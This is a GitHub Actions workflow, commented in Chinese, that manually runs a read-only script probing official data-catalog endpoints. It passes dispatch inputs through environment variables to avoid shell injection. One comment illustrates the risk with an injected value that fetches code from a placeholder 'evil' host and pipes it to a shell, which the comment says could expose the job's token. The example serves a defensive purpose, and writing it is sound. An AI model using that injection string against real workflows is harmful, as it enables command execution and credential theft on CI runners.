name: Verify catalog sources

# 手動觸發 only。刻意不加 schedule:定期對官方端點發流量是持續性的
# 外部負載,屬維運決策,由維護者決定要不要排程(見 issue #25 Slice 2)。
on:
  workflow_dispatch:
    inputs:
      only:
        description: "只探測此 dataset_id(留空 = 全部)"
        required: false
        type: string
      enabled_only:
        description: "只探測已啟用的 entry(上游漂移檢查)"
        required: false
        default: false
        type: boolean

permissions:
  contents: read

jobs:
  verify:
    name: probe official endpoints
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09 # v5

      - name: Set up Python
        uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065 # v5.6.0
        with:
          python-version: "3.11"

      - name: Install package
        run: python -m pip install -e .

      # 本 script 只讀:不寫 DB、不改 catalog.py、不翻 enabled。
      # 輸出的 verified_at / verified_note 需人工 review 後以 PR 填入。
      # inputs 一律經 env 傳入並加引號,絕不直接內插進 run:。
      # 直接內插等於把 workflow_dispatch 的自由文字欄位接到 shell 上(CWE-78):
      # `--only "; curl evil | sh #"` 會成為 runner 上執行的指令,拿得到
      # GITHUB_TOKEN 與這個 job 的全部環境。pages.yml 已採 env 寫法,此處對齊。
      - name: Probe catalog sources
        env:
          ONLY: ${{ inputs.only }}
          ENABLED_ONLY: ${{ inputs.enabled_only }}
        run: |
          set -euo pipefail
          args=()
          if [ -n "$ONLY" ]; then
            args+=(--only "$ONLY")
          fi
          if [ "$ENABLED_ONLY" = "true" ]; then
            args+=(--enabled-only)
          fi
          python scripts/verify_catalog_sources.py ${args[@]+"${args[@]}"}
